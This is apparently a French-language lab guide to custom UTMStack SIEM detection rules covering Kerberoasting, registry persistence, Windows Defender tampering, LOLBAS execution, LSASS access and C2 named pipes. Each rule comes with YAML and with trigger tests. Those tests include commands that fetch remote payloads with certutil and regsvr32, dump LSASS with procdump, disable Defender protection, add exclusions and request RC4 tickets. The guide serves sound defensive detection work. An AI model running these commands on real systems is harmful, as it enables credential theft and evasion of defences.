description: 'Une demande de ticket Kerberos avec chiffrement RC4 (type 23) a été détectée (EID 4769). Dans un environnement moderne, les tickets légitimes utilisent AES256 (type 18). Une demande RC4 sur un compte de service avec SPN est le signal caractéristique d''une attaque Kerberoasting, l''attaquant récupère le hash RC4 pour le cracker hors ligne. Les comptes machine et les comptes Azure AD Connect sont exclus. Next Steps: 1. Identifier le compte demandeur via target.user et la machine source via origin.ip. 2. Vérifier si d''autres demandes RC4 ont été émises depuis la même source dans la même fenêtre temporelle (signe d''un scan de comptes SPN). 3. Contrôler si le compte de service ciblé (event.eventDataServiceName) dispose de droits élevés. 4. Réinitialiser le mot de passe du compte de service ciblé. 5. Envisager la migration vers des comptes gMSA (Group Managed Service Accounts) pour éliminer le vecteur.'
where: |-
  equals("event.eventCode", 4769) &&
  equals("event.channel", "Security") &&
  equals("event.eventDataTicketEncryptionType", 23) &&
  equals("event.eventDataStatus", 0) &&
  !regexMatch("event.eventDataServiceName", "(?i)\\$$") &&
  !equals("event.eventDataServiceName", "krbtgt") &&
  !regexMatch("target.user", "(?i)^(MSOL_|AAD_|AZUREADSSOACC)")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

La règle W7 nécessite un compte de service avec SPN configuré en RC4 uniquement (pas AES). Sur DC01-MAIN-SITE (contrôleur de domaine) en PowerShell admin :

```powershell
# Créer un compte de service avec SPN et forcer RC4
New-ADUser -Name "svc-test-w7" -SamAccountName "svc-test-w7" `
  -AccountPassword (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) -Enabled $true
Set-ADUser "svc-test-w7" -Add @{ServicePrincipalName="HTTP/svc-test-w7.lan.local"}
# Forcer RC4 uniquement (supprimer le support AES)
Set-ADUser "svc-test-w7" -Replace @{"msDS-SupportedEncryptionTypes" = 4}

# Depuis WIN11-AD-TESTS, demander un ticket Kerberos RC4
klist purge
Add-Type -AssemblyName System.IdentityModel
[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new("HTTP/svc-test-w7.lan.local")

# Nettoyage
Remove-ADUser -Identity "svc-test-w7" -Confirm:$false
```

---

### S5b : Registry Run Key Persistence (Security 4657)

Une valeur a été écrite dans une clé de démarrage automatique du registre (`Run` ou `RunOnce`), détectée par l'audit natif de Windows. C'est la variante de S5 qui ne dépend pas de Sysmon : elle fonctionne sur toute machine où l'audit du registre est actif, y compris les postes Windows 11 dont l'agent UTMStack ne collecte pas Sysmon.

**Technique MITRE :** T1547.001 · Registry Run Keys

✅ **Statut v11.3.0 :** nouvelle règle, validée. En v11.2, elle figurait en annexe comme non implémentable (« W8 ») : le chemin de la clé n'était pas mappé dans les champs structurés. En v11.3.0, il l'est (`event.eventDataObjectName`).

```yaml
name: S5b - Registry Run Key Persistence (Security 4657)
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Persistence
technique: T1547.001 - Boot or Logon Autostart Execution Registry Run Keys
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1547/001/
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657
description: 'Une valeur a été écrite dans une clé de démarrage automatique du registre (Run ou RunOnce), détectée par l''audit natif Windows (Security 4657). Variante de S5 sans dépendance à Sysmon : elle fonctionne sur toute machine où l''audit du registre est actif et où une SACL est posée sur les clés Run. Les modifications effectuées par des processus système légitimes sont exclues. Next Steps: 1. Identifier la valeur ajoutée via event.data.ObjectValueName et la commande persistée via event.data.NewValue. 2. Vérifier le chemin de l''exécutable référencé, un chemin dans Temp ou AppData est très suspect. 3. Identifier le processus ayant effectué la modification via event.eventDataProcessName et le compte via event.eventDataSubjectUserName. 4. Supprimer la valeur si non autorisée. 5. Analyser l''exécutable référencé (hash, VirusTotal).'
where: |-
  equals("event.eventCode", 4657) &&
  equals("event.channel", "Security") &&
  regexMatch("event.eventDataObjectName", "(?i)\\\\(Run|RunOnce)$") &&
  !equals("event.eventDataOperationType", "%%1906") &&
  !regexMatch("event.eventDataProcessName", "(?i)\\\\(services|svchost|msiexec|trustedinstaller|tiworker)[.]exe$") &&
  !contains("event.eventDataProcessName", "Windows Defender") &&
  !contains("event.eventDataProcessName", "UTMStack")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Prérequis :** audit du registre activé et SACL posée sur les clés `Run` et `RunOnce`. Dans le lab, deux GPO s'en chargent : `Audit HKCU RunKeys` (configuration utilisateur, clés de HKCU) et `Audit RUN KEY local machine` (configuration ordinateur, clés de HKLM).

**Suppressions exclues :** l'EID 4657 est aussi émis quand une valeur est supprimée (`OperationType = %%1906`). Une suppression n'installe pas de persistance : elle est exclue.

**Faux positif connu :** Edge et EdgeWebView écrivent dans les clés `RunOnce` lors de leurs mises à jour. À exclure par le chemin exact de l'exécutable si le volume le justifie.

**Exemple de test :** en PowerShell, sur une machine où la SACL est en place :

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestS5b" -Value "C:\Users\Public\test.exe"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestS5b"
```

L'écriture déclenche l'alerte, la suppression non.

---

## Série WD : Windows Defender

Ces cinq règles couvrent les événements Windows Defender sur les endpoints. Elles utilisent les journaux `Microsoft-Windows-Windows Defender` collectés par l'agent UTMStack. Les fichiers YAML sont disponibles dans [`rules/windows-defender/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/windows-defender).

### WD1 : Malware Detected (EID 1116)

Windows Defender a détecté un malware sur un endpoint. Aucune règle native UTMStack ne couvre l'EID 1116 : cette règle custom est indispensable pour remonter les détections Defender dans le SIEM. Le champ `event.data.ThreatName` contient le nom complet de la menace (ex : `Trojan:Win32/Meterpreter.gen!A`).

**Technique MITRE :** T1204.002 · User Execution: Malicious File (approximation : aucune technique ATT&CK ne correspond exactement à une détection antivirus)

✅ **Statut v11.3.0 :** validée, après correction : le champ s'appelle `Threat Name`, avec une espace. La version v11.2 n'avait jamais fonctionné.

```yaml
name: Windows Defender - Malware Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Malware Defense
technique: T1204.002 - User Execution Malicious File
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1204/002/
  - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus
description: 'Windows Defender a détecté un malware sur un endpoint (EID 1116). Le champ event.data.ThreatName contient le nom complet de la menace détectée (ex: Trojan:Win32/Meterpreter.gen!A). Aucune règle native UTMStack ne couvre cet event, cette règle custom est nécessaire pour remonter les détections Defender dans le SIEM. Next Steps: 1. Identifier le fichier détecté via event.data.Path. 2. Identifier le nom complet de la menace via event.data.ThreatName. 3. Vérifier si la remédiation automatique a réussi, consulter l''EID 1117 (remédiation réussie) ou EID 1118 (remédiation échouée) sur le même host dans les minutes suivantes. 4. Si remédiation échouée (WD4), isoler le poste immédiatement. 5. Corréler avec les events Sysmon sur le même host pour identifier le vecteur d''infection.'
where: |-
  equals("event.eventCode", 1116) &&
  exists("event.data.Threat Name")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** télécharger le fichier de test EICAR (`https://www.eicar.org/download/eicar.com.txt`) sur un endpoint Windows. Defender détecte la signature EICAR comme `Virus:DOS/EICAR_Test_File` et génère l'EID 1116 immédiatement, suivi de l'EID 1117 (remédiation réussie). MDE génère également une alerte dans `security.microsoft.com`.

---

### WD2 : Tamper Protection Blocked (EID 5013)

La Tamper Protection de Windows Defender a bloqué une tentative de modification des paramètres de sécurité. Signal fort d'une tentative d'évasion de défense : un ransomware ou malware avancé tente systématiquement de désactiver Defender avant son déploiement.

**Faux positif documenté :** certains events EID 5013 ont `event.data.Changed Type = "Ignoré"` : Defender loggue des changements de configuration interne qu'il a lui-même ignorés (non appliqués). Ces events bénins sont exclus par le filtre.

**Technique MITRE :** T1562.001 · Impair Defenses: Disable or Modify Tools

✅ **Statut v11.3.0 :** validée. L'exclusion couvre désormais les deux langues (`Ignoré`, `Ignored`).

```yaml
name: Windows Defender - Tamper Protection Blocked (Event 5013)
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Defense Evasion
technique: T1562.001 - Impair Defenses Disable or Modify Tools
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/001/
  - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection
description: 'La Tamper Protection de Windows Defender a bloqué une tentative de modification des paramètres de sécurité (Event 5013). Cet événement indique qu''un processus ou utilisateur a tenté de désactiver ou modifier Windows Defender mais a été bloqué. C''est un signal fort d''une tentative d''évasion de défense, technique MITRE T1562.001. Next Steps: 1. Identifier le processus ayant tenté la modification via les logs de sécurité (Event 4688). 2. Vérifier l''utilisateur connecté au moment de l''event. 3. Contrôler les events 1116/1117 récents sur la même machine. 4. Investiguer si d''autres techniques d''évasion ont été tentées simultanément.'
where: |-
  equals("event.eventCode", 5013) &&
  equals("event.providerName", "Microsoft-Windows-Windows Defender") &&
  !oneOf("event.data.Changed Type", ["Ignoré", "Ignored"])
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** depuis un poste géré par Intune (Intune, Tamper Protection active), tenter en PowerShell admin : `Set-MpPreference -DisableTamperProtection $true`. L'opération est bloquée et génère l'EID 5013 avec `event.data.Changed Type` différent de `"Ignoré"`.

---

### WD3 : Real-Time Protection Disabled (EID 5001)

La protection en temps réel de Windows Defender a été désactivée. Action classique des ransomwares et malwares avant leur déploiement. **Non testé en live dans ce lab** : Tamper Protection active sur un poste géré par Intune bloque toute désactivation, empêchant la génération de l'EID 5001.

**Technique MITRE :** T1562.001 · Impair Defenses: Disable or Modify Tools

⚠️ **Statut v11.3.0 :** non testable dans le lab, l'opération est bloquée par la Tamper Protection.

```yaml
name: Windows Defender - Real-Time Protection Disabled (Event 5001)
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Defense Evasion
technique: T1562.001 - Impair Defenses Disable or Modify Tools
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/001/
  - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus
description: 'La protection en temps réel de Windows Defender a été désactivée sur un endpoint. Cette action est une technique d''évasion classique utilisée par les ransomwares et les malwares avancés avant leur déploiement (MITRE T1562.001 - Impair Defenses). Une désactivation non planifiée doit être considérée comme une compromission potentielle. Next Steps: 1. Vérifier si la désactivation est planifiée et autorisée. 2. Identifier le processus ou l''utilisateur ayant désactivé la protection. 3. Vérifier les events 1116/1117 récents sur la même machine. 4. Contrôler les connexions réseau sortantes depuis l''endpoint. 5. Réactiver immédiatement la protection si non autorisée.'
where: |-
  equals("event.eventCode", 5001) &&
  equals("event.providerName", "Microsoft-Windows-Windows Defender")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** sur une machine **sans Tamper Protection active**, exécuter `Set-MpPreference -DisableRealtimeMonitoring $true` en PowerShell admin. Ne pas tester sur une machine Intune avec Tamper Protection : l'opération sera bloquée et générera WD2 (EID 5013) à la place.

---

### WD4 : Malware Remediation Failed (EID 1118)

Windows Defender a détecté un malware mais n'a pas pu effectuer la remédiation. Le malware est toujours présent : intervention manuelle immédiate requise. **Non testé en live** : nécessite un malware résistant à la remédiation automatique, non reproductible de façon contrôlée.

**Technique MITRE :** T1204 · User Execution

⚠️ **Statut v11.3.0 :** non testée, il faut un malware que Defender ne parvient pas à supprimer.

```yaml
name: Windows Defender - Malware Remediation Failed (Event 1118)
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Malware Defense
technique: T1204 - User Execution
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1204/
  - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus
description: 'Windows Defender a détecté un logiciel malveillant mais n''a pas pu effectuer l''action de remédiation (quarantaine ou suppression). Le malware est toujours présent sur la machine, intervention manuelle requise immédiatement. Vérifier le champ event.data.Threat Name pour le nom de la menace et event.data.Path pour le chemin du fichier. Next Steps: 1. Isoler immédiatement la machine du réseau. 2. Identifier le fichier via event.data.Path. 3. Tenter une remédiation manuelle depuis le portail security.microsoft.com. 4. Analyser les connexions réseau sortantes depuis l''endpoint. 5. Vérifier si d''autres machines sont affectées.'
where: |-
  equals("event.eventCode", 1118) &&
  equals("event.providerName", "Microsoft-Windows-Windows Defender")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** non reproductible de façon contrôlée. En pratique, corréler avec WD1 (EID 1116) sur le même host : l'absence d'EID 1117 (remédiation réussie) après WD1 dans une fenêtre de quelques minutes est un signal indirect de WD4.

---

### WD5 : Defender Exclusion Added (EID 5007)

Une exclusion a été ajoutée à Windows Defender (EID 5007). C'est une technique courante après une compromission pour masquer des outils malveillants.

**Technique MITRE :** T1562.001 · Impair Defenses: Disable or Modify Tools

✅ **Statut v11.3.0 :** validée, après réécriture sur un critère positif (voir plus bas).

```yaml
name: Windows Defender - Exclusion Added (Event 5007)
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1562.001 - Impair Defenses Disable or Modify Tools
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/001/
  - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus
description: 'La configuration de Windows Defender a été modifiée sur un endpoint (Event 5007). Les modifications les plus critiques sont l''ajout d''exclusions de fichiers, dossiers ou processus, technique couramment utilisée post-compromise pour masquer des outils malveillants et empêcher leur détection. La règle se déclenche sur toute modification de configuration 5007, à l''exception des mises à jour de configuration poussées par Intune (WdConfigHash, UX Configuration, DLP Configs, EcsConfigs). Vérifier le champ event.data.New Value pour identifier la modification effectuée. Next Steps: 1. Identifier la modification via event.data.New Value (exclusion ajoutée, paramètre modifié). 2. Vérifier si la modification est autorisée et planifiée. 3. Contrôler les events de connexion récents sur cette machine (Event 4624/4625). 4. Vérifier si d''autres modifications de sécurité ont eu lieu dans la même fenêtre temporelle. 5. Supprimer l''exclusion si non autorisée et investiguer l''origine de la modification.'
where: |-
  equals("event.eventCode", 5007) &&
  equals("event.providerName", "Microsoft-Windows-Windows Defender") &&
  exists("event.data.New Value") &&
  contains("event.data.New Value", "\\Exclusions\\")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Réécriture en v11.3.0 :** la version v11.2 se déclenchait sur toute modification de configuration et excluait au cas par cas les faux positifs connus (`WdConfigHash`, `UX Configuration`, `DLP Configs`, `EcsConfigs`). En v11.3.0, de nouveaux faux positifs sont apparus : les échecs intermittents de MAPS (protection cloud) et les changements sous `Features\Controls`. Plutôt que d'allonger la liste, la règle ne retient plus que les écritures sous `\Exclusions\`, qui couvrent les exclusions de chemin, d'extension, de processus et d'adresse IP. Le garde `exists("event.data.New Value")` évite les échecs d'évaluation sur les 5007 qui ne portent pas ce champ.

**Test de déclenchement :** depuis WIN11-AD-TESTS en PowerShell admin :

```powershell
Add-MpPreference -ExclusionPath "C:\Temp\test-wd5"
Remove-MpPreference -ExclusionPath "C:\Temp\test-wd5"
```

L'alerte contient `event.data.New Value` avec le chemin exclu et `event.data.Old Value` vide pour l'ajout.

---

## Série S : Sysmon via WEF

Les règles S utilisent les événements Sysmon collectés via Windows Event Forwarding (WEF). Les événements Sysmon arrivent dans UTMStack via le canal `ForwardedEvents` et sont indexés dans `v11-log-wineventlog-*` avec `dataType = wineventlog`. Les fichiers YAML sont disponibles dans [`rules/sysmon/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/sysmon).

### Limitations connues

**Canal `Microsoft-Windows-Sysmon/Operational` non collecté nativement par l'agent UTMStack** : la liste des canaux Windows collectés est hardcodée dans le binaire de l'agent. `ForwardedEvents` est présent, mais `Microsoft-Windows-Sysmon/Operational` ne l'est pas (confirmé par analyse binaire de `utmstack_agent_service_windows_amd64.exe`). Ce comportement a été signalé à UTMStack ([GitHub issue #2446](https://github.com/utmstack/UTMStack/issues/2446)).

Le contournement retenu est une **self-subscription WEF** : chaque machine crée une souscription WEF locale qui recopie les événements Sysmon vers son propre canal `ForwardedEvents`, lequel est nativement collecté par l'agent. Ce contournement fonctionne sur Windows Server 2022/2025 et les contrôleurs de domaine. Il **échoue sur Windows 11** (erreur 2150859027) : l'endpoint `/SubscriptionManager/WEC` n'est pas exposé sur les SKUs client Windows, quels que soient les réglages WinRM, URL ACL ou pare-feu. Ce comportement a été vérifié sur deux machines Windows 11 24H2 distinctes après diagnostic exhaustif.

Conséquence pratique : les règles S s'appliquent aux serveurs et contrôleurs de domaine, mais pas aux postes de travail Windows 11 sans déploiement d'un collecteur WEF centralisé.

**EID 1 (ProcessCreate) absent des événements WEF** : l'EID 1 Sysmon n'est pas remonté par WEF via `ForwardedEvents`, même quand la souscription est active et que les autres EIDs (8, 10, 11, 12, 13, 17) fonctionnent correctement. La règle S1 utilise EID 4688 (journal Security) comme contournement : ce qui nécessite la GPO "Inclure la ligne de commande dans les événements de création de processus".

**Filtre sur le canal** : en v11.2, le canal Sysmon était indexé en `text`, d'où l'usage de `contains("event.channel", "Sysmon")` plutôt que `equals()`. Cette forme fonctionne toujours en v11.3.0 et a été conservée. Les événements Sysmon transmis par WEF arrivent avec le canal d'origine, que la machine soit un contrôleur de domaine ou un serveur membre.

---

### S1 : LOLBAS Execution Detected (EID 4688)

Un binaire Windows légitime fréquemment détourné (LOLBAS : Living Off the Land Binaries and Scripts) a été exécuté avec une ligne de commande suspecte. Cette règle complète la règle native UTMStack "Windows: LOLBin Proxy Execution / Ingress Tool Transfer".

**Prérequis :** GPO "Inclure la ligne de commande dans les événements de création de processus" activée.

**Défense en profondeur :** lors des tests, MDE a bloqué les exécutions (`certutil -urlcache` → Trojan:Win32/Ceprolad.A, `regsvr32 /i:http scrobj.dll` → Trojan:Win32/Powemet.A!attk) tandis que la règle native UTMStack et S1 généraient des alertes SIEM complémentaires. Les trois couches ont fonctionné simultanément : MDE bloque, le SIEM contextualise et corrèle.

**Technique MITRE :** T1218 · System Binary Proxy Execution

✅ **Statut v11.3.0 :** validée. L'audit de création de processus n'était pas actif sur le poste de test : la règle ne voyait rien.

```yaml
name: S1 - LOLBAS Execution Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1218 - System Binary Proxy Execution
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1218/
  - https://lolbas-project.github.io/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
description: 'Un binaire Windows légitime fréquemment détourné (LOLBAS) a été exécuté avec une ligne de commande suspecte (EID 4688). Les attaquants utilisent ces binaires signés Microsoft (certutil, mshta, regsvr32, rundll32, etc.) pour télécharger des payloads, exécuter du code distant ou contourner les défenses sans déposer d''exécutable malveillant. Cette règle nécessite l''activation de la GPO "Inclure la ligne de commande dans les événements de création de processus". Note : Sysmon EID 1 serait l''approche idéale mais l''agent UTMStack ne remonte pas cet EID, EID 4688 est le contournement retenu. Next Steps: 1. Examiner la ligne de commande complète via event.data.CommandLine. 2. Identifier le processus parent via event.data.ParentProcessName (un parent Office ou navigateur est très suspect). 3. Vérifier si la commande télécharge un fichier distant ou exécute du code encodé. 4. Corréler avec les connexions réseau et créations de fichiers dans la même fenêtre. 5. Isoler la machine si le pattern est confirmé malveillant.'
where: |-
  equals("event.eventCode", 4688) &&
  regexMatch("event.data.NewProcessName", "(?i)\\\\(certutil|mshta|regsvr32|rundll32|installutil|odbcconf|msbuild|bitsadmin|wmic|cmstp|regasm|regsvcs)[.]exe$") &&
  !equals("event.eventDataSubjectUserSid", "S-1-5-18") &&
  !(contains("event.data.NewProcessName", "rundll32.exe") &&
    regexMatch("event.data.CommandLine", "(?i)C:\\\\Windows\\\\system32\\\\.*\\.dll")) &&
  (
    contains("event.data.CommandLine", "http") ||
    contains("event.data.CommandLine", "-urlcache") ||
    contains("event.data.CommandLine", "javascript:") ||
    contains("event.data.CommandLine", "vbscript:") ||
    contains("event.data.CommandLine", "-decode") ||
    contains("event.data.CommandLine", "-encode") ||
    contains("event.data.CommandLine", "scrobj.dll") ||
    contains("event.data.CommandLine", "/i:") ||
    regexMatch("event.data.CommandLine", "(?i)\\.(sct|xsl|hta)$")
  )
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis WIN11-AD-TESTS, en PowerShell :

```powershell
# Test certutil, téléchargement via HTTP (MDE bloquera l'exécution réelle)
certutil -urlcache -split -f http://10.100.1.10/test.txt C:\Temp\test.txt

# Test regsvr32, script COM distant (MDE bloquera)
regsvr32 /s /n /u /i:http://10.100.1.10/test.sct scrobj.dll
```

---

### S2 : Suspicious LSASS Process Access (EID 10)

Un processus a accédé à la mémoire de `lsass.exe` avec des droits suspects. LSASS contient les credentials des sessions actives. Deux variantes sont disponibles selon l'environnement.

**Technique MITRE :** T1003.001 · LSASS Memory

🔵 **Statut v11.3.0 :** validée en passif. Seule la variante VMware est active dans le lab ; elle exclut `vmtoolsd.exe` par son chemin exact.

**Variante universelle (`s2-lsass-access.yml`) :** pour les environnements sans VMware.

**Variante VMware (`s2-lsass-access-vmware.yml`) :** pour les labs et environnements virtualisés VMware. Ajoute l'exclusion de `vmtoolsd.exe` qui accède légitimement à LSASS pour collecter des informations sur les processus actifs. Les masques 5120 et 5200 et l'agent Azure AD Connect Health sont également exclus (voir la réserve sur 5200 ci-dessous). Ne pas importer les deux simultanément.

```yaml
name: S2 - Suspicious LSASS Process Access (VMware)
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1003.001 - OS Credential Dumping LSASS Memory
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1003/001/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
description: 'Variante de S2 pour environnements virtualisés VMware Workstation/ESXi. Identique à s2-lsass-access.yml avec exclusion supplémentaire de vmtoolsd.exe (VMware Tools) qui accède légitimement à LSASS pour collecter des informations sur les processus actifs. Les masques 5120 (0x1400, query-only) et 5200 (0x1450, qui inclut VM_READ : choix de tuning à réévaluer) et l''agent Azure AD Connect Health sont également exclus. Utiliser cette variante à la place de S2 dans les labs et environnements VMware, ne pas importer les deux simultanément. Next Steps: 1. Identifier le processus source via event.data.SourceImage. 2. Vérifier les droits d''accès via event.data.GrantedAccess, les valeurs 4112 (0x1010) et 5136 (0x1410) sont caractéristiques de Mimikatz et des outils de dumping. Attention : UTMStack stocke ce champ en décimal, pas en hexadécimal. 3. Analyser event.data.CallTrace pour identifier les modules chargés, la présence de frames UNKNOWN indique une DLL non mappée sur disque, signe possible d''injection. 4. Isoler la machine si un outil de dumping est confirmé. 5. Réinitialiser tous les mots de passe si compromise confirmée.'
where: |-
  equals("event.eventCode", 10) &&
  contains("event.channel", "Sysmon") &&
  contains("event.data.TargetImage", "lsass.exe") &&
  !equals("event.data.GrantedAccess", 5120) &&
  !equals("event.data.GrantedAccess", 5200) &&
  !contains("event.data.SourceImage", "Windows Defender Advanced Threat Protection") &&
  !contains("event.data.SourceImage", "Windows Defender") &&
  !contains("event.data.SourceImage", "Azure AD Connect Health Agent") &&
  !contains("event.data.SourceImage", "UTMStack") &&
  !contains("event.data.SourceImage", "MRT.exe") &&
  !contains("event.data.SourceImage", "taskmgr.exe") &&
  !equals("event.data.SourceImage", "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note sur les masques d'accès :** UTMStack stocke `event.data.GrantedAccess` en décimal. Les masques couramment cités dans la littérature Sysmon en hexadécimal correspondent aux valeurs décimales suivantes :

| Décimal | Hexadécimal | Signification | Verdict |
|---|---|---|---|
| 5120 | `0x1400` | QUERY_LIMITED_INFORMATION + QUERY_INFORMATION | ✅ bénin : exclus |
| 5200 | `0x1450` | 0x1400 + DUP_HANDLE + VM_READ | ⚠️ exclu par la règle (choix de tuning, à réévaluer) |
| 4112 | `0x1010` | QUERY_LIMITED_INFORMATION + VM_READ | 🔴 Mimikatz classique |
| 5136 | `0x1410` | 0x1400 + VM_READ | 🔴 suspect |
| 2097151 | `0x1FFFFF` | PROCESS_ALL_ACCESS | ⚠️ selon contexte |

Le discriminant est le bit `VM_READ (0x0010)` : sans lui, la lecture de la mémoire de lsass est structurellement impossible. Le masque `5120` (`0x1400`) ne le contient pas. Le masque `5200` (`0x1450`), en revanche, le contient : son exclusion réduit le bruit mais crée un angle mort, à réévaluer selon les processus qui le génèrent dans votre environnement.

**Test de déclenchement**

Sur les machines équipées de MDE Plan 1, les outils de dump connus (`comsvcs.dll MiniDump`, `procdump.exe`) sont interceptés avant que Sysmon génère l'EID 10. La validation se fait par vérification des events déjà présents en base.

Vérifier les events EID 10 récents avec un masque suspect dans OpenSearch :

```bash
docker exec $(docker ps -q -f name=utmstack_node1) curl -sk \
  -u 'admin:<OPENSEARCH_PASSWORD>' \
  'https://localhost:9200/v11-log-wineventlog-*/_search' \
  -H 'Content-Type: application/json' \
  -d '{
  "size": 5,
  "query": {
    "bool": {
      "filter": [
        { "term": { "event.eventCode": 10 } },
        { "match_phrase": { "raw": "lsass.exe" } },
        { "range": { "@timestamp": { "gte": "now-24h" } } }
      ]
    }
  },
  "sort": [{ "@timestamp": "desc" }],
  "_source": ["@timestamp", "dataSource", "event.data.SourceImage", "event.data.GrantedAccess"]
}' | python3 -m json.tool
```

En v11.3.0, `match_phrase` sur un champ `event.*` renvoie 0 sans erreur : la recherche de texte se fait donc dans `raw`.

Un event avec `event.data.GrantedAccess` à `4112` ou `5136` depuis un `SourceImage` inattendu doit déclencher l'alerte. Un event à `5120` ou `5200` ne déclenche pas : ces masques sont exclus par la règle (voir la réserve sur `5200` ci-dessus).

Sur une VM de test **isolée de MDE et du domaine**, ProcDump de Sysinternals permet de générer un event EID 10 contrôlé :

```cmd
procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
```

> ⚠️ **Environnement isolé obligatoire.** ProcDump crée un dump complet contenant les credentials de toutes les sessions actives. Cette commande ne doit jamais être exécutée sur une machine domain-joined ou avec des sessions utilisateur actives.

---

### S3 : Suspicious Named Pipe Created (EID 17)

Un named pipe avec un nom caractéristique d'un framework offensif a été créé. Les frameworks C2 comme Cobalt Strike, Metasploit et Mimikatz utilisent des named pipes spécifiques pour leurs communications.

Lors des tests, MDE a identifié automatiquement le pattern `\msagent_test` comme "Cobalt Strike named pipes" avec une alerte HIGH : illustration de la complémentarité entre EDR et SIEM.

**Technique MITRE :** T1559.001 · Named Pipes

✅ **Statut v11.3.0 :** validée. La version v11.2 n'avait **jamais produit d'alerte** : la regex contenait `\.`, échappement invalide en CEL, remplacé par `[.]`.

```yaml
name: S3 - Suspicious Named Pipe Created
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Command and Control
technique: T1559.001 - Inter-Process Communication Named Pipes
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1559/001/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  - https://www.cobaltstrike.com/blog/learn-pipe-fitting-for-all-of-your-offense-projects
description: 'Un named pipe avec un nom caractéristique d''un framework offensif a été créé (Sysmon EID 17). Les frameworks C2 comme Cobalt Strike, Metasploit et Mimikatz utilisent des named pipes pour leurs communications inter-processus et leurs techniques de post-exploitation. Les pipes légitimes Windows (services.exe, etc.) sont exclus. Next Steps: 1. Identifier le processus créateur via event.data.Image. 2. Vérifier le nom exact du pipe via event.data.PipeName et le comparer aux patterns connus. 3. Rechercher d''autres activités suspectes depuis le même ProcessGuid. 4. Corréler avec les connexions réseau sortantes depuis la même machine. 5. Isoler la machine si un framework C2 est confirmé.'
where: |-
  equals("event.eventCode", 17) &&
  contains("event.channel", "Sysmon") &&
  equals("event.data.EventType", "CreatePipe") &&
  regexMatch("event.data.PipeName", "(?i)(\\\\(msagent_|mojo[.]|postex_|status_|MSSE-|psexec|paexec|remcom|csexec)|\\\\pipe\\\\pipe\\\\|lsadump)") &&
  !contains("event.data.Image", "services.exe")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note :** le motif `mojo.` est aussi utilisé par Chrome et Edge pour leurs named pipes légitimes : surveiller les faux positifs liés aux navigateurs.

**Test de déclenchement**

Depuis WIN11-AD-TESTS, en PowerShell admin :

```powershell
# Créer un named pipe avec un nom de pattern Cobalt Strike
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("msagent_test")
Start-Sleep -Seconds 2
$pipe.Dispose()
```

---

### S4 : Suspicious Access to NTDS or SAM Files (EID 11)

Un processus a créé ou modifié un fichier dans le répertoire NTDS ou dans les chemins des bases SAM/SYSTEM/SECURITY. La base `ntds.dit` contient tous les hashes de mots de passe du domaine.

Lors des tests, MDE a déclenché une alerte "Suspicious credential dump from NTDS.dit" sur la création d'un fichier vide nommé `ntds.dit` : même comportement de détection par nom de fichier.

**Note technique :** `New-Item` PowerShell ne génère pas d'EID 11 Sysmon. Il faut utiliser `cmd.exe` ou `echo` pour créer le fichier et déclencher l'event FileCreate.

**Technique MITRE :** T1003.003 · NTDS

✅ **Statut v11.3.0 :** validée par un test scripté, après correction de l'exclusion du processus System (voir plus bas).

```yaml
name: S4 - Suspicious Access to NTDS or SAM Files
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Credential Access
technique: T1003.003 - OS Credential Dumping NTDS
adversary: origin
references:
